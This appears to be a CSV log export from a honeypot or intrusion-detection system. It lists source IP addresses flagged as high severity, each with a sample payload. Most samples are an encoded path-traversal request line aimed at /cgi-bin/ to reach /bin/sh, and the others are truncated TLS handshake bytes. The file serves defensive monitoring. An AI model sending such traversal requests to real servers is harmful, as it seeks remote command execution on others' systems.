IP,SEVERITY,COUNT,SAMPLE_PAYLOAD
176.113.115.74,HIGH,3,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x18\x83s\xC9L\xE6\x18\xF6\xA1\x04\xAF\xE3\xFB X\xED\xA6"
190.242.189.254,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
192.210.140.39,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
195.40.154.8,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
199.45.154.127,HIGH,3,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xC9&\xE4z=y\x9B\xDACtG\xF8B\xB2\x97\xB1\xE4\xA3\x04\x88"
217.154.69.208,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
23.94.26.208,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
24.65.233.27,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
37.202.236.248,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.135.193.11,HIGH,3,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xA5i\xCC@=w\x17}\xC9^\xFB/\xAD\xC7N\xD2\xBC*N\xF9.\x96\"
45.192.110.181,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.33.80.243,HIGH,3,"\x16\x03\x01\x01"
45.78.235.68,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
59.7.246.67,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
85.11.183.6,HIGH,3,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x8A\xF27\x88\x84\xF1K\xA7\x17|\xEA\xD1;\xC5\x95_\x7F\xC"
107.173.241.217,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
